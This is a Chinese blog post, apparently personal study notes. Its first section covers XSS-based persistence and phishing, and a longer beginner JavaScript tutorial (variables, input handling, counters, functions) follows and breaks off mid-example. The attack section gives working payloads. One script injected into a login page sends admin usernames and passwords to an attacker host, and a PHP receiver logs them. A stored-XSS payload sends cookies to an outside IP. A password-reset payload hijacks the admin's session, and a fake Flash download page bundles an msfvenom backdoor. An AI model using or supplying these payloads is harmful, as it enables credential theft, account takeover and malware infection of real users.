<!DOCTYPE html>


<html lang="zh-CN">
  

    <head>
      <meta charset="utf-8" />
        
      <meta
        name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1"
      />
      <title>js&amp;xss扩展 |  是羽泪云诶</title>
  <meta name="generator" content="hexo-theme-ayer">
      
      <link rel="shortcut icon" href="/favicon.ico" />
       
<link rel="stylesheet" href="/dist/main.css">

      
<link rel="stylesheet" href="/css/fonts/remixicon.css">

      
<link rel="stylesheet" href="/css/custom.css">
 
      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
       
 

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
      />
      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>

      <!-- mermaid -->
      
      <style>
        .swal2-styled.swal2-confirm {
          font-size: 1.6rem;
        }
      </style>
    </head>
  </html>
</html>


<body>
  <div id="app">
    
      <canvas class="fireworks"></canvas>
      <style>
        .fireworks {
          position: fixed;
          left: 0;
          top: 0;
          z-index: 99999;
          pointer-events: none;
        }
      </style>
      
      
    <main class="content on">
      <section class="outer">
  <article
  id="post-xsskuozhan"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
  
    
    <header class="article-header">
       
<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
  js&amp;xss扩展
</h1>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/11/08/xsskuozhan/" class="article-date">
  <time datetime="2023-11-08T14:25:25.000Z" itemprop="datePublished">2023-11-08</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/xss/">xss</a> / <a class="article-category-link" href="/categories/xss/js/">js</a>
  </div>
  
<div class="word_count">
    <span class="post-time">
        <span class="post-meta-item-icon">
            <i class="ri-quill-pen-line"></i>
            <span class="post-meta-item-text"> 字数统计:</span>
            <span class="post-count">9.5k</span>
        </span>
    </span>

    <span class="post-time">
        &nbsp; | &nbsp;
        <span class="post-meta-item-icon">
            <i class="ri-book-open-line"></i>
            <span class="post-meta-item-text"> 阅读时长≈</span>
            <span class="post-count">48 分钟</span>
        </span>
    </span>
</div>
 
    </div>
      
    <div class="tocbot"></div>




  
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="其它xss"><a href="#其它xss" class="headerlink" title="其它xss"></a>其它xss</h1><h1 id="低版本IE-xss"><a href="#低版本IE-xss" class="headerlink" title="低版本IE-xss"></a>低版本IE-xss</h1><p><strong>uxss</strong></p>
<p>利用的是客户端(浏览器)本身的漏洞</p>
<p><strong>flash-xss</strong></p>
<p>swf与js代码应用</p>
<p>swf文件下载后反编译</p>
<p><strong>PDFXSS</strong></p>
<p>PDF动作添加-&gt;文件上传，获取直链，值链被访问时触发</p>
<h1 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h1><h2 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h2><h3 id="1-后台植入cookie-x2F-表单劫持"><a href="#1-后台植入cookie-x2F-表单劫持" class="headerlink" title="1.后台植入cookie&#x2F;表单劫持"></a>1.后台植入cookie&#x2F;表单劫持</h3><p>条件：<strong>取得相关web权限后</strong>(不是黑盒测试了)</p>
<p>1.写入代码到<strong>登录成功文件</strong>(写到源码里，如index.php的头部或尾部来一个&lt;script&gt;)，利用beef或xss平台实时监控<strong>cookie</strong></p>
<p>2.同源策略或其他防护条件下，使用<strong>表单劫持</strong>或<strong>明文传输实现</strong></p>
<p>比如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://jieshou.com/get.php?user=账号&amp;pass=密码&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">#对于php这样写，将下列语句插入到登录的php文件中</span><br><span class="line">$x=&#x27;&lt;script src=http://jieshou.com/get.php?user=&#x27;.$admin_name.&#x27;&amp;pass=&#x27;.$admin_pass.&#x27;&gt;&lt;/script&gt;&#x27;;</span><br><span class="line">echo $x;</span><br><span class="line">或者</span><br><span class="line">windows.location.href=...</span><br></pre></td></tr></table></figure>

<p>服务器准备一个接收文件get.php，传参可以是cookie可以是账号等，内容为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$u</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="variable">$myfile</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;newfile.txt&quot;</span>,<span class="string">&quot;w+ &quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$u</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="string">&#x27;|&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$p</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="2-flash钓鱼页-msf"><a href="#2-flash钓鱼页-msf" class="headerlink" title="2.flash钓鱼页+msf"></a>2.flash钓鱼页+msf</h3><p>仿造的一个下载flash软件的页面</p>
<p>将该页面文件，即index.html中添加为</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>立即下载<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://attacker.com/flash_install.exe&quot;</span> <span class="attr">target</span>=<span class="string">_self</span>&gt;</span>立即下载<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当然，这个exe是正版的，真正有猫腻的在于捆绑部分</p>
<p>用<code>msfvenom</code> 生成一个后门exe叫做 flash.exe</p>
<p>将正版安装包和flash.exe下到一起后，用rar打包</p>
<p><img src="/../../../Typora/img111/image-20231109113742289.png" alt="设置解压路径为绝对路径"></p>
<p><img src="/../../../Typora/img111/image-20231109113819590.png" alt="设置好路径+软件名"></p>
<p>攻击的时候可以来一个html页面，去诱导它升级flash，对方点击确认后，跳转到假的flash页面</p>
<p>受害者下载后，攻击者这边就可以msf监听</p>
<h3 id="3-xss-浏览器网马配合msf访问上线"><a href="#3-xss-浏览器网马配合msf访问上线" class="headerlink" title="3.xss-浏览器网马配合msf访问上线"></a>3.xss-浏览器网马配合msf访问上线</h3><p>条件：beef上线受控后直接钓鱼(浏览器存在0day)</p>
<p>1.配置msf生成url</p>
<p>msf生成一个网马</p>
<p>2.诱导受害者访问</p>
<h2 id="例子1"><a href="#例子1" class="headerlink" title="例子1"></a>例子1</h2><p>当我注册登录一个页面后，有查看其他用户的账号和密码的页面，记为页A，但提示说不是 <strong>管理员</strong>，无法查看</p>
<p>可以利用存储性xss，将xss插入到密码中</p>
<p>注册一个账号，密码为：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;windows.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://121.121.121.121/get.php?c=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>这个是为了将<strong>管理员</strong>的<strong>cookie</strong>传参到攻击者的一个接收cookie的文件上，一旦管理员登录，就可以接收到它的cookie</p>
<p>攻击者刷新 <strong>页A</strong>，然后替换cookie，达到查看目的</p>
<p><strong>防御：Cookie凭据失效处理，如一次性</strong></p>
<p>这个时候用 <strong>js获取表单</strong>，密码为一个获取当前页面内容的js，当管理员访问的时候，将该页面内容返回回来</p>
<p>xss接收平台，将后台页面的内容直接获取</p>
<h2 id="例子2"><a href="#例子2" class="headerlink" title="例子2"></a>例子2</h2><p>后台管理员有功能页面，查看注册用户的账号和密码</p>
<p>其中有一个修改的密码，（抓包分析，需要用户登录状态），通过访问一个地址即可修改密码</p>
<p>攻击：注册一个用户名和密码存在跳转修改密码的URL地址链接，当管理员登录后台，查看了用户的注册密码信息，就可以尝试重置密码</p>
<p>你比如将用户名设置为：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;windows.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://127.0.0.1/api/change.php?p=123&#x27;</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>这样登录的话，没准可以admin，123登录成功</p>
<p>对于用户管理页面，抓个包，拦截一下，没准就可以看到信息</p>
<h2 id="例子3-post"><a href="#例子3-post" class="headerlink" title="例子3-post"></a>例子3-post</h2><p>如果对于表单是post请求的话</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$.<span class="title function_">ajax</span>(&#123;<span class="attr">url</span>:<span class="string">&#x27;http://127.0.0.1/api/change.php&#x27;</span>,<span class="attr">type</span>:<span class="string">&#x27;post&#x27;</span>,<span class="attr">data</span>:&#123;<span class="attr">p</span>:<span class="string">&#x27;123&#x27;</span>&#125;&#125;);</span><br></pre></td></tr></table></figure>

<h1 id="js"><a href="#js" class="headerlink" title="js"></a>js</h1><p>javascript</p>
<p><strong>干什么</strong></p>
<ol>
<li>为网站提供交互功能</li>
<li>构建web或者移动端应用</li>
<li>开发一个命令行工具</li>
</ol>
<p><strong>工具</strong></p>
<p>vscode、chrom</p>
<p>vscode扩展：</p>
<p>​	live server：每次保存js都会实时更新浏览器的一些变化</p>
<h2 id="1-开始"><a href="#1-开始" class="headerlink" title="1.开始"></a>1.开始</h2><p>创建三个文件，js、html、css</p>
<p>在html下</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;style.css&quot;</span>&gt;</span> <span class="comment">&lt;!--link css文件--&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;index.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> <span class="comment">&lt;!--link js文件--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="2-变量-显示"><a href="#2-变量-显示" class="headerlink" title="2.变量+显示"></a>2.变量+显示</h2><ol>
<li><strong>Declaration</strong>：(var，let，const)</li>
<li><strong>Assignment</strong>：(* assignment operator)</li>
</ol>
<p>看一下js的效果</p>
<p><img src="/../../../Typora/img111/image-20231109150100323.png"></p>
<p>这只是控制台输出，那怎么输出到网页中去呢？</p>
<p>首先html定义三个字段</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;p1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;p2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;p3&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;index.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>js中添加</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;p1&quot;</span>).<span class="property">innerHTML</span>=<span class="string">&quot;my age is &quot;</span>+age;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;p2&quot;</span>).<span class="property">innerHTML</span>=<span class="string">&quot;i am a student? &quot;</span>+stu</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;p3&quot;</span>).<span class="property">innerHTML</span>=<span class="string">&quot;my name is &quot;</span>+name;</span><br></pre></td></tr></table></figure>

<p>效果</p>
<p><img src="/../../../Typora/img111/image-20231109150410390.png" alt="js显示于html"></p>
<h2 id="3-运算符"><a href="#3-运算符" class="headerlink" title="3.运算符"></a>3.运算符</h2><p><strong>+,-,*,&#x2F;,%</strong></p>
<p>类似于所学的语言了，不解释了</p>
<h2 id="4-输入"><a href="#4-输入" class="headerlink" title="4.输入"></a>4.输入</h2><p><strong>法一</strong>：<strong>window.prompt</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> username=<span class="variable language_">window</span>.<span class="title function_">prompt</span>(<span class="string">&quot;psz input your name?&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(username);</span><br></pre></td></tr></table></figure>

<p>效果</p>
<p><img src="/../../../Typora/img111/image-20231109151039368.png" alt="image-20231109151039368"></p>
<p><strong>法二</strong>: html text box</p>
<p>在html下</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">id</span>=<span class="string">&quot;mylabel&quot;</span>&gt;</span>ENter your name!<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;myinput&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;subbmit&quot;</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/../../../Typora/img111/image-20231109151802254.png" alt="提交"></p>
<p>在js下添加点击事件</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;subbmit&quot;</span>).<span class="property">onclick</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    username=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;myinput&quot;</span>).<span class="property">value</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(username);</span><br><span class="line">    <span class="comment">//顺便更改标签的值</span></span><br><span class="line">     <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;mylabel&quot;</span>).<span class="property">innerHTML</span>=<span class="string">&quot;Hello! &quot;</span>+username;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/../../../Typora/img111/image-20231109151945851.png" alt="改变label"></p>
<h2 id="5-类型转换"><a href="#5-类型转换" class="headerlink" title="5.类型转换"></a>5.类型转换</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> x,y,z;</span><br><span class="line">x=<span class="title class_">Number</span>(<span class="number">3.14</span>);</span><br><span class="line">y=<span class="title class_">String</span>(<span class="number">3.14</span>);</span><br><span class="line">z=<span class="title class_">Boolean</span>(<span class="string">&quot;Yuleiyun&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(x,<span class="keyword">typeof</span> x); <span class="comment">//3.14 &#x27;number&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(y,<span class="keyword">typeof</span> y); <span class="comment">//3.14 string</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(z,<span class="keyword">typeof</span> z); <span class="comment">//true &#x27;boolean&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="6-常量"><a href="#6-常量" class="headerlink" title="6.常量"></a>6.常量</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> pi=<span class="number">123</span>;</span><br><span class="line">pi=<span class="number">2323</span>;<span class="comment">//会报错</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(pi);</span><br></pre></td></tr></table></figure>

<h2 id="7-数学运算符"><a href="#7-数学运算符" class="headerlink" title="7.数学运算符"></a>7.数学运算符</h2><p>pow()，round()、ceil()、floor()用到再说</p>
<h2 id="8-计数机制"><a href="#8-计数机制" class="headerlink" title="8.计数机制"></a>8.计数机制</h2><p>html</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">id</span>=<span class="string">&quot;mylabel&quot;</span>&gt;</span>0<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;dec&quot;</span>&gt;</span>减1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;res&quot;</span>&gt;</span>重置<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;inc&quot;</span>&gt;</span>加1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> count=<span class="number">0</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;dec&quot;</span>).<span class="property">onclick</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">     count-=<span class="number">1</span>;</span><br><span class="line">     <span class="comment">//count--;</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;mylabel&quot;</span>).<span class="property">innerHTML</span>=count;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;res&quot;</span>).<span class="property">onclick</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">   <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;mylabel&quot;</span>).<span class="property">innerHTML</span>=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;inc&quot;</span>).<span class="property">onclick</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    count+=<span class="number">1</span>;</span><br><span class="line">   <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;mylabel&quot;</span>).<span class="property">innerHTML</span>=count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>css</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#mylabel</span>&#123;</span><br><span class="line">    <span class="attribute">display</span>:block;</span><br><span class="line">    <span class="attribute">text-align</span>:center;</span><br><span class="line">    <span class="attribute">font-size</span>:<span class="number">50px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="9-杂项"><a href="#9-杂项" class="headerlink" title="9.杂项"></a>9.杂项</h2><p><strong>随机数生成</strong></p>
<p><strong>截取</strong></p>
<p>它是自带的slice()，用法同substr</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">user=<span class="string">&quot;hello!yu&quot;</span>;</span><br><span class="line"><span class="comment">//user=user.slice(4);// o!yu</span></span><br><span class="line"><span class="comment">//user=user.slice(2,4);//ll 左闭右开</span></span><br><span class="line"><span class="comment">//user=user.slice(0,user.indexOf(&quot;y&quot;));//hello!</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user);</span><br></pre></td></tr></table></figure>

<p><strong>if else&#x2F;and,or,not&#x2F;while,for,嵌套for&#x2F;break,continue</strong></p>
<p>略</p>
<p><strong>函数</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">start</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> p1=<span class="string">&quot;sada&quot;</span>;</span><br><span class="line">    <span class="keyword">let</span> p2=<span class="string">&quot;12312&quot;</span>;</span><br><span class="line">    <span class="title function_">func2</span>(p1,p2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">func2</span>(<span class="params">a,b</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;It&#x27;s &quot;</span>+a);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;It&#x27;s &quot;</span>+b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>return 也是可以的</p>
<p><strong>三元符</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> num=<span class="title function_">check</span>(<span class="number">15</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params">n</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> n&gt;<span class="number">20</span>?<span class="string">&quot;yes&quot;</span>:<span class="string">&quot;no&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>var与let</strong></p>
<p>1.let 限制在 **{}**里；而var用在一个函数格式 <strong>func(){}</strong> 里，</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">1</span>;i&lt;=<span class="number">3</span>;i++)&#123; <span class="comment">//i没有定义</span></span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(i);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">1</span>;i&lt;=<span class="number">3</span>;i++)&#123; <span class="comment">//i=4</span></span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(i);</span><br></pre></td></tr></table></figure>

<p>但是如果值在函数中声明了，函数外需要使用时，需要将这个指 <strong>全局定义</strong></p>
<p>2.用<strong>var</strong>定义全局时，会在浏览器的window属性找到</p>
<p>而<strong>let</strong>定义的找不到，或者说，它改不了</p>
<p><strong>反引号与参数-嵌入文本吧</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> name=<span class="string">&quot;b2323&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello, &quot;</span>,name);<span class="comment">//hello,  b2323</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`hello <span class="subst">$&#123;name&#125;</span>`</span>);<span class="comment">//hello b2323</span></span><br></pre></td></tr></table></figure>

<p><strong>形式处理</strong></p>
<p>比如保留多少位，字符串格式什么的</p>
<h3 id="猜字游戏"><a href="#猜字游戏" class="headerlink" title="猜字游戏"></a>猜字游戏</h3><p>html</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">id</span>=<span class="string">&quot;mylabel&quot;</span>&gt;</span>Guess the num 1-10<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;myinput&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;mybutton&quot;</span>&gt;</span>提交了<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>js</p>
